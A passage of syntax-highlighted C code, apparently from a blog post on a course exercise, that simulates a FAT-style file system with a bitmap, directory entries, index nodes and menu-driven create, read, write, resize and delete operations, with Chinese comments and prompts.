随机申请一块物理块 假如已经被使用  则往后寻找</span></span><br><span class="line">    srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">int</span> index = rand() % BLOCKNUM;</span><br><span class="line">    <span class="keyword">int</span> r = index / <span class="number">16</span>, c = index % <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (d.bitmap[r][c] == <span class="number">0</span>) &#123;</span><br><span class="line">        d.bitmap[r][c] = <span class="number">1</span>;</span><br><span class="line">        d.freeBlock--;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i, j;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">15</span>) &#123;</span><br><span class="line">            i = (r + <span class="number">1</span>) % <span class="number">7</span>;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = r;</span><br><span class="line">            j = (c + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; <span class="number">7</span>; )</span><br><span class="line">            <span class="keyword">for</span> (; j &lt; <span class="number">16</span>; ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (d.bitmap[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    d.bitmap[i][j] = <span class="number">1</span>;</span><br><span class="line">                    d.freeBlock--;</span><br><span class="line">                    <span class="keyword">return</span> (i * <span class="number">16</span> + j);</span><br><span class="line">                &#125;</span><br><span class="line">                j++;</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="number">16</span>)&#123;</span><br><span class="line">                    i = (i + <span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">                    j = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 格式化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intial</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; i++) d.FAT[i] = EOF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ROW; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COL; j++) d.bitmap[i][j] = FREE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCKNUM; i++) &#123;</span><br><span class="line">        d.blocks[i].firstLogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        d.blocks[i].secondLogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        d.blocks[i].thirdogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    d.fileNum = <span class="number">0</span>;</span><br><span class="line">    dirLastIndex = <span class="number">0</span>;</span><br><span class="line">    fdiLastIndex = <span class="number">0</span>;</span><br><span class="line">    d.freeBlock = BLOCKNUM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码：</span></span><br><span class="line"><span class="comment"> * 2：文件已存在</span></span><br><span class="line"><span class="comment"> * 3：磁盘空间不足</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Create</span><span class="params">(<span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d.directory[i].fileName, fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">int</span> blockId = getFreeBlock();</span><br><span class="line">    <span class="keyword">if</span> (blockId == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; fdiLastIndex; i++)</span><br><span class="line">            <span class="keyword">if</span> (d.FDI[i].isDelete) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 处理索引结点</span></span><br><span class="line">        d.FDI[i].firstBlockId = d.FDI[i].lastBlockId = blockId;</span><br><span class="line">        <span class="comment">// 获取当前时间戳</span></span><br><span class="line">        time(&amp;(d.FDI[i].createTime));</span><br><span class="line">        d.FDI[i].LastEditTime = d.FDI[i].createTime;</span><br><span class="line">        d.FDI[i].permission = <span class="number">444</span>;</span><br><span class="line">        d.FDI[i].usedBlocksNum = <span class="number">1</span>;</span><br><span class="line">        d.FDI[i].isDelete = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dirLastIndex; j++)</span><br><span class="line">            <span class="keyword">if</span> (d.directory[j].nodeId == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 处理目录项</span></span><br><span class="line">        <span class="built_in">strcpy</span>(d.directory[j].fileName, fileName);</span><br><span class="line">        d.directory[j].nodeId = i;</span><br><span class="line">        <span class="keyword">if</span> (i == dirLastIndex) dirLastIndex++;</span><br><span class="line">        <span class="keyword">if</span> (j == fdiLastIndex) fdiLastIndex++;</span><br><span class="line">        d.fileNum++;</span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">char</span> msg[LOGICALSIZE];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> * 1:读取正常</span></span><br><span class="line"><span class="comment"> * 2:文件不存在</span></span><br><span class="line"><span class="comment"> * 3:逻辑记录号错误</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct readReturn <span class="title">Read</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">int</span> logical_record_no)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> <span class="title">r</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filename, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) &#123;</span><br><span class="line">        r.status = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> BlockId = logical_record_no / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (BlockId + <span class="number">1</span> &gt; d.FDI[d.directory[i].nodeId].usedBlocksNum) &#123;</span><br><span class="line">        r.status = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> index = d.FDI[i].firstBlockId;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; BlockId; j++) index = d.FAT[index];</span><br><span class="line">    <span class="keyword">switch</span> (logical_record_no % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].firstLogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].secondLogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].thirdogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    r.status = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码：</span></span><br><span class="line"><span class="comment"> * 2：文件不存在</span></span><br><span class="line"><span class="comment"> * 3：逻辑记录号错误</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Write</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="built_in">text</span>, <span class="keyword">int</span> logical_record_no)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filename, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (logical_record_no &lt; <span class="number">0</span> ||</span><br><span class="line">        logical_record_no &gt;= d.FDI[i].usedBlocksNum * <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// 通过 firstBlockId 在 FAT 中寻找正确的位置写入</span></span><br><span class="line">    <span class="keyword">int</span> index = d.FDI[i].firstBlockId, blockId = logical_record_no / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; blockId; j++) index = d.FAT[index];</span><br><span class="line">    <span class="keyword">switch</span> (logical_record_no % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].firstLogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].secondLogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].thirdogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取当前时间戳</span></span><br><span class="line">    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入新文件名：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="keyword">int</span> status = Create(fileName);</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"该文件已存在，请先删除旧文件再创建该文件。\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (status == <span class="number">3</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"磁盘空间不足！无法创建新文件。\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建成功!\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryRead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> logical_record_no;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入想要读取的文件名：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入想要读取的逻辑记录号（编号从零开始）：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;logical_record_no);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> <span class="title">r</span> = <span class="title">Read</span>(<span class="title">fileName</span>, <span class="title">logical_record_no</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (r.status == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"该文件不存在！请重新输入文件名。\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r.status == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"该文件没有该逻辑记录，请输入正确的逻辑记录号。\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"读取到的内容是\n%s\n"</span>, r.msg);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryWrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>], <span class="built_in">text</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> logical_record_no, newBlockSize;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>, choice;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.向文件中写入数据\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.修改文件大小\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.返回\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入您的选择：\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入想要写入的文件名：\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入想要写入的逻辑记录号（编号从零开始）：\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;logical_record_no);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入您想要写入的信息（一次最多写入%d个字符）\n"</span>,</span><br><span class="line">                       LOGICALSIZE);</span><br><span class="line">                getchar();</span><br><span class="line">                gets(<span class="built_in">text</span>);</span><br><span class="line">                <span class="keyword">int</span> status = Write(fileName, <span class="built_in">text</span>, logical_record_no);</span><br><span class="line">                <span class="keyword">if</span> (status == <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"文件不存在，请输入正确的文件名！\n"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == <span class="number">3</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(</span><br><span class="line">                        <span class="string">"您输入的逻辑记录号过大或者是负数，您可以通过增加文件大"</span></span><br><span class="line">                        <span class="string">"小使得文件拥有该逻辑记录号\n"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"写入成功！\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入您想要修改的文件名：\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    <span class="string">"请输入该文件新大小（若新的大小小于原来的大小，则只保留新的"</span></span><br><span class="line">                    <span class="string">"大小的数据，新大小应该是一个大于零的数字，单位：块）：\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;newBlockSize);</span><br><span class="line">                <span class="comment">// 索引结点所在下标</span></span><br><span class="line">                <span class="keyword">int</span> i;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fileName, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">                        d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= dirLastIndex) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"文件不存在，请输入正确的文件名！\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newBlockSize &gt; d.FDI[i].usedBlocksNum) &#123;</span><br><span class="line">                    <span class="comment">// 增加文件大小</span></span><br><span class="line">                    <span class="keyword">int</span> need = newBlockSize - d.FDI[i].usedBlocksNum, blockId;</span><br><span class="line">                    <span class="keyword">while</span> (need) &#123;</span><br><span class="line">                        blockId = getFreeBlock();</span><br><span class="line">                        <span class="keyword">if</span> (blockId == <span class="number">-1</span>) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(</span><br><span class="line">                                <span class="string">"磁盘空间不足！只成功申请了 %d "</span></span><br><span class="line">                                <span class="string">"个物理块，申请失败 %d 个\n"</span>,</span><br><span class="line">                                newBlockSize - need, need);</span><br><span class="line">                            system(<span class="string">"pause"</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        need--;</span><br><span class="line">                        d.FAT[d.FDI[i].lastBlockId] = blockId;</span><br><span class="line">                        d.FDI[i].lastBlockId = blockId;</span><br><span class="line">                        d.FDI[i].usedBlocksNum++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"修改成功！\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newBlockSize &lt; d.FDI[i].usedBlocksNum) &#123;</span><br><span class="line">                    <span class="comment">// 减小文件</span></span><br><span class="line">                    <span class="keyword">int</span> index = d.FAT[d.FDI[i].firstBlockId], count = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span> (count &lt; newBlockSize) &#123;</span><br><span class="line">                        index = d.FAT[index];</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 回收后面的磁盘空间</span></span><br><span class="line">                    <span class="keyword">while</span> (newBlockSize - count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">int</span> old = d.FAT[index];</span><br><span class="line">                        index = d.FAT[index];</span><br><span class="line">                        d.FAT[old] = EOF;</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"修改成功！\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"您输入有误，请重新输入！\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showBitmap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"“0”代表空闲，“1”代表已用\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i * <span class="number">16</span> + j &gt;= BLOCKNUM) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>, d.bitmap[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">15</span>) <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showFiles</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"----------------------------------------------------------------------"</span></span><br><span class="line">        <span class="string">"--------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%-20s|%-19s|%-19s|%-10s|%-10s|\n"</span>, <span class="string">"文件名"</span>, <span class="string">"创建日期"</span>,</span><br><span class="line">           <span class="string">"修改日期"</span>, <span class="string">"权限信息"</span>, <span class="string">"文件大小"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (d.directory[i].nodeId != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                <span class="string">"|%-20s|%4d-%2d-%2d %2d:%2d:%2d|%4d-%2d-%2d "</span></span><br><span class="line">                <span class="string">"%2d:%2d:%2d|%-10d|%-10d|\n"</span>,</span><br><span class="line">                d.directory[i].fileName,</span><br><span class="line">                <span class="comment">// 年份从1900开始算起，因此要加上1900</span></span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_year +</span><br><span class="line">                    <span class="number">1900</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_mon + <span class="number">1</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_mday,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_hour + <span class="number">8</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_min,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_sec,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_year +</span><br><span class="line">                    <span class="number">1900</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_mon +</span><br><span class="line">                    <span class="number">1</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_mday,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_hour +</span><br><span class="line">                    <span class="number">8</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_min,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_sec,</span><br><span class="line">                d.FDI[d.directory[i].nodeId].permission,</span><br><span class="line">                d.FDI[d.directory[i].nodeId].usedBlocksNum);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"----------------------------------------------------------------------"</span></span><br><span class="line">        <span class="string">"--------------\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码：</span></span><br><span class="line"><span class="comment"> * 2：文件不存在</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Delete</span><span class="params">(<span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d.directory[i].fileName, fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> nextIndex = d.FDI[d.directory[i].nodeId].firstBlockId;</span><br><span class="line">    <span class="keyword">int</span> row, col, pre;</span><br><span class="line">    <span class="keyword">while</span> (d.FAT[nextIndex] != EOF) &#123;</span><br><span class="line">        row = nextIndex / COL;</span><br><span class="line">        col = nextIndex % COL;</span><br><span class="line">        d.bitmap[row][col] = FREE;</span><br><span class="line">        pre = nextIndex;</span><br><span class="line">        nextIndex = d.FAT[nextIndex];</span><br><span class="line">        d.FAT[pre] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    row = nextIndex / COL;</span><br><span class="line">    col = nextIndex % COL;</span><br><span class="line">    d.bitmap[row][col] = FREE;</span><br><span class="line">    d.FDI[d.directory[i].nodeId].isDelete = <span class="number">1</span>;</span><br><span class="line">    d.directory[i].nodeId = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryDelete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">11</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入您想要删除的文件：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="keyword">int</span> status = Delete(fileName);</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"该文件不存在，请重新输入!\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"删除成功！\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showFAT</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, len = <span class="number">25</span>, j = <span class="number">1</span>, t, k;</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= <span class="number">4</span>; j++) &#123;</span><br><span class="line">        t = i;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= <span class="number">114</span>; k++) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"|%-12s|"</span>, <span class="string">"编号"</span>);</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; j * len; i++) <span class="built_in">printf</span>(<span class="string">"%-3d|"</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"|%-12s|"</span>, <span class="string">"下一块盘块号"</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = t; i &lt; j * len; i++) <span class="built_in">printf</span>(<span class="string">"%-3d|"</span>, 